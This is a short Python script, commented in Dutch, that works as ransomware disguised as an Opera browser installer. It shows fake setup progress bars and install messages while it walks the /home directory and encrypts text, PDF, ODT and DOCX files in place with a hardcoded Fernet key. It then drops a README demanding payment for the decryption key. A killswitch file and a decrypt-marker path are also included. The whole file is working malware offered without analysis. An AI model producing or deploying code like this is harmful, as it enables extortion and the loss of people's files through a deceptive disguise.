import os
from cryptography.fernet import Fernet
from tqdm import tqdm
import time

#Killswitch Functie
try:
   Killswitch = open(".kill.txt", "r")
   Killswitch_Bool = True
except:
   Killswitch_Bool = False

if Killswitch_Bool==True:
    print("KillSwitch actief.")
    exit()
else:
    pass

#Check of er gedecrypt moet worden.
try:
   check = open(".decrypt.txt", "r")
   check_1 = 1
except:
   check_1 = 0

#Fake init.
for i in tqdm(range(100)):
   time.sleep(0.05)
print("Opera_Setup init completed.")

#Hier zoek functie
#Def var voor opslaan van lijstdata van zoekfunctie.
bestandenlijst = []
# Gebruik os.walk()
for dirpath, dirs, files in os.walk('/home'): 
  for filename in files:
    fname = os.path.join(dirpath,filename)
    if fname.endswith('.txt') or fname.endswith('.pdf') or fname.endswith('.odt') or fname.endswith('.docx'):
      bestandenlijst.append(fname)

#Fernetkey
key = "LvKBgbdRvSZZHwBt9WcJw9rR5Aya4BIkzi-NpZKGnzw="
if check_1 == 1:
   crypto = Fernet(key)
   for file in bestandenlijst:
      try:
         with open(file, 'rb') as f:
            file_inhoud = f.read()
         ontsleutelde_inhoud = crypto.decrypt(file_inhoud)
         with open(file, 'wb') as f:
            f.write(ontsleutelde_inhoud)
      except Exception as e:
         print(f"Fout bij {file}: {e}")
else:
    crypto = Fernet(key)
    for file in bestandenlijst:
        with open(file, 'rb') as f:
            file_inhoud = f.read()
        versleutelde_data = crypto.encrypt(file_inhoud)
        with open(file, 'wb') as f:
            f.write(versleutelde_data)

#Fake install messages.
if check_1 == 1:
   for i in tqdm(range(256)):
      time.sleep(0.10)
   print("Opera Uninstalled! :(")
elif check_1 == 0:
   for i in tqdm(range(256)):
      time.sleep(0.10)
   print("Opera Installed! :)")

#Readme aanmaken.
Readme = open("README.txt","w")
Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\nOm je bestanden tedecrypten moet je geld overmaken naar XXX.\nDan zal je de decryptkey ontvangen!")
Readme.close()

#Decryptfile aanmaken.
Decrypt = open(".decrypt.txt","w")
Decrypt.write("b8cdef42e552ca7389708a4e3001510b9ca22a5a2a78be9dcc51d50f73e4d25b32b44d103c681d26efdf391f11878035e2cafbeb49629aab0d8702a9d228a12b")
Decrypt.close()